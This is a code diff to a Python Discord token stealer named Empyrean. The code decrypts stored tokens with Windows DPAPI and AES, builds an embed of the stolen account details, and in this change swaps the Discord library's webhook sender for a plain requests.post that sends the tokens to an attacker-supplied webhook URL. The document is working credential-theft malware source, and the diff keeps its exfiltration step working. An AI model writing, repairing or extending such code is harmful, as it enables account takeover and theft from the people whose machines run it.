@@ -2,10 +2,9 @@ import base64
 import json
 import os
 import re
-
 import requests
 from Crypto.Cipher import AES
-from discord import Embed, SyncWebhook
+from discord import Embed
 from win32crypt import CryptUnprotectData
 
 
@@ -145,7 +144,7 @@ class extract_tokens:
 class upload_tokens:
     def __init__(self, webhook: str):
         self.tokens = extract_tokens().tokens
-        self.webhook = SyncWebhook.from_url(webhook)
+        self.webhook_url = webhook
 
     def calc_flags(self, flags: int) -> list:
         flags_dict = {
@@ -393,5 +392,14 @@ class upload_tokens:
 
             embed.set_footer(text="github.com/addi00000/empyrean")
 
-            self.webhook.send(embed=embed, username="Empyrean",
-                              avatar_url="https://i.imgur.com/HjzfjfR.png")
+            webhook_payload = {
+                "content": "Token Information",
+                "embeds": [embed.to_dict()],
+                "username": "Empyrean",
+                "avatar_url": "https://i.imgur.com/HjzfjfR.png"
+            }
+
+            try:
+                requests.post(self.webhook_url, json=webhook_payload)
+            except requests.exceptions.RequestException as e:
+                print(f"Erro ao enviar a mensagem: {e}")
